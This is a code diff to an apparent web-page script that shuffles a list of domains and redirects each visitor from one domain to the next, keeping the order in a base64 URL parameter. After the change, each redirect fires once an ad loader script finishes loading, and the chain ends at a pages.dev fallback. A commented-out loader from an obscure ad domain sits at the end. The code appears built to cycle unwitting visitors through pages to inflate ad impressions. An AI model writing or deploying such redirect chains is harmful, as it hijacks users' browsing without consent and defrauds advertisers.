@@ -41,13 +41,16 @@ function shuffle(array) {
   return array;
 }
 
+const currentDomain = window.location.origin + '/';
+const otherDomains = domains.filter(d => d !== currentDomain);
+
 let params = new URLSearchParams(window.location.search);
 let orderParam = params.get('order');
 let index = parseInt(params.get('index')) || 0;
 
 let order;
 if (!orderParam) {
-  order = shuffle([...domains]);
+  order = shuffle([...otherDomains]);
   index = 0;
 } else {
   order = atob(orderParam).split(',');
@@ -57,10 +60,9 @@ const adScript = document.getElementById('AdsCoreLoader97547');
 
 function handleRedirect() {
   setTimeout(() => {
-    if (index < order.length - 1) {
-      index++;
+    if (index < order.length) {
       const orderStr = btoa(order.join(','));
-      const nextUrl = order[index] + '?order=' + orderStr + '&index=' + index;
+      const nextUrl = order[index] + '?order=' + orderStr + '&index=' + (index + 1);
       window.location.href = nextUrl;
     } else {
       window.location.href = 'https://testss-3c9.pages.dev/';
@@ -69,10 +71,7 @@ function handleRedirect() {
 }
 
 if (adScript) {
-  adScript.addEventListener('error', handleRedirect);
-} else {
-  // Fallback if script not found
-  handleRedirect();
+  adScript.addEventListener('load', handleRedirect);
 }
 </script>
 <!--     <script>(function(s){s.dataset.zone='10190027',s.src='https://gizokraijaw.net/vignette.min.js'; s.addEventListener('load', onScriptLoad); s.addEventListener('error', onScriptLoad);})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
